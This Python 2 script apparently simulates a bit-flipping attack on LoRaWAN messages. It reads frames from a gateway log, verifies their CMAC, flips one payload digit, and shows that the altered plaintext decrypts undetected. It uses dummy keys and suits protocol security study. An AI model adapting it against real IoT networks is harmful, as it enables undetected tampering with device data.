from Crypto.Cipher import AES
from Crypto.Hash import CMAC
import binascii
import time
import base64
# from AES_CMAC import AES_CMAC
# import base64

class bitfliping_attack(object):
    def mote(self,nwkskey,appskey,devaddr):
        fctrl = '00'
        fcnt = 'ad00'
        fopts = ''
        fport = '15'
        mhdr = '40'
        dir = '00'
        mote_data = '1016 157'

        pld = mote_data.encode('hex')+'0000000000000000'
        block_encrypt = '0100000000' + dir +devaddr + fcnt +'000000' + '01'
        block_encrypt = binascii.a2b_hex(block_encrypt)
        cipher_key = AES.new(appskey)
        cipher_block = cipher_key.encrypt(block_encrypt).encode('hex')
        # print cipher_block,pld,len(pld),len(cipher_block)
        frmpayload = hex(int(cipher_block,16) ^ int(pld,16))[2:18]

        fhdr = devaddr + fctrl + fcnt + fopts
        macpayload = fhdr + fport + frmpayload
        msg = mhdr +macpayload

        block_sign = '4900000000' + dir + devaddr +fcnt + '000000' + hex(len(msg))[2:] + msg
        block_sign = binascii.a2b_hex(block_sign)
        sign_key = CMAC.new(nwkskey, msg=block_sign,ciphermod=AES)
        mic = sign_key.hexdigest()[:8]

        phypayload = msg + mic

        return phypayload,binascii.a2b_hex(mote_data.encode('hex'))

    def readLog(self, label, file):
        file.seek(label, 0)
        info = file.read()
        info = info.split('\n')
        label = file.tell()
        return info, label

    def gatewaylog(self,devaddr):

        label = 0
        m = 0


        while 1:
            m += 1
            print time.asctime()
            path = "/home/xueying/PycharmProjects/lorawan/bitflipping/attack4.txt"
            file = open(path, "r")
            info, label = bitfliping_attack().readLog(label, file)
            # print info,label
            for i in range(len(info)):
                if 'rxInfo' in info[i]:
                    phy_index = info[i].index('phyPayload')
                    phy = info[i][phy_index + 13:-2]
                    phy_hex = binascii.hexlify(base64.decodestring(phy))
                    ctr = phy_hex[12:16]
                    ctr = int(ctr[2:] + ctr[:2], 16)
                    devaddr_cal = phy_hex[2:10]


                    if m != 1 and devaddr_cal == devaddr:
                        print 'DevAddr', devaddr_cal, ', Counter number is', ctr, ', Physical Payload is', phy_hex
                        return phy_hex
            time.sleep(20)


    def nwkserver(self,nwkskey,phypayload):
        msg = phypayload[:-8]
        # print len(msg),hex(len(msg))[2:],msg
        devaddr = msg[2:10]
        dir = '00'
        fcnt = msg[12:16]
        mic = phypayload[-8:]
        # print devaddr,fcnt

        block_sign = '4900000000' + dir + devaddr + fcnt + '000000' + hex(len(msg)/2)[2:] + msg
        block_sign = binascii.a2b_hex(block_sign)

        sign_key = CMAC.new(nwkskey, ciphermod=AES)
        sign_key.update(block_sign)

        mic_cal = sign_key.hexdigest()[:8]
        # print mic_cal.upper(),mic, sign_key.hexdigest(),block_sign.encode('hex')

        if mic_cal == mic:
            print '[Network Server]: Signature is correct. Message is pushed to application server\r\n[Network Server]: Message sent to application server is',phypayload
        else:
            print '[Network Server]: Signature error','mic_cal is',mic_cal,'mic is',mic
        return msg

    def appserver(self,msg,appskey):
        frmpayload = msg[18:]
        devaddr = msg[2:10]
        dir = '00'
        fcnt = msg[12:16]
        block_encrypt = '0100000000' + dir + devaddr + fcnt + '000000' + '01'
        block_encrypt = binascii.a2b_hex(block_encrypt)
        cipher_key = AES.new(appskey)
        cipher_block = cipher_key.encrypt(block_encrypt).encode('hex')
        # print cipher_block,frmpayload
        ciphertext = hex(int(frmpayload + '0000000000000000',16) ^ int(cipher_block,16))[2:-1]
        plaintext = ciphertext[:16]
        # print '[Application Server]: Meesage is decrypted'
        return plaintext


    def attacker(self,msg,flag):
        msg1 = msg[:-7] + '2' + msg[-6:]
        print '[Attack - ',flag,']: Bit fliping.....Message', msg, 'is changed to', msg1
        return msg1


devaddr = '99999999'
nwkskey = '11111111111111111111111111111111'
appskey = '22222222222222222222222222222222'
nwkskey = binascii.a2b_hex(nwkskey)
appskey = binascii.a2b_hex(appskey)

flag = 1
# phypayload = '40999999990032007A5AD813D9598103018E7CB15F'
while True:
    phypayload = bitfliping_attack().gatewaylog(devaddr)
    msg = bitfliping_attack().nwkserver(nwkskey,phypayload)
    msg1 = bitfliping_attack().attacker(msg,flag)
    # msg1 = msg[:-7]+ '2'+msg[-6:]
    # print '[Attack]: Bit fliping.....Message',msg,'is changed to',msg1
    # plaintext = '3334203032360000'
    plaintext= bitfliping_attack().appserver(msg,appskey)
    plaintext2 = binascii.a2b_hex(plaintext)
    plaintext_cal = bitfliping_attack().appserver(msg1,appskey)
    plaintext_cal2 = binascii.a2b_hex(plaintext_cal)

    if plaintext == plaintext_cal:
        print '[Application server]: Message is correct',plaintext_cal2
    else:
        print  '[Application server]: Message is not the same. Received',plaintext_cal2,'. Mote sent',plaintext2
    flag += 1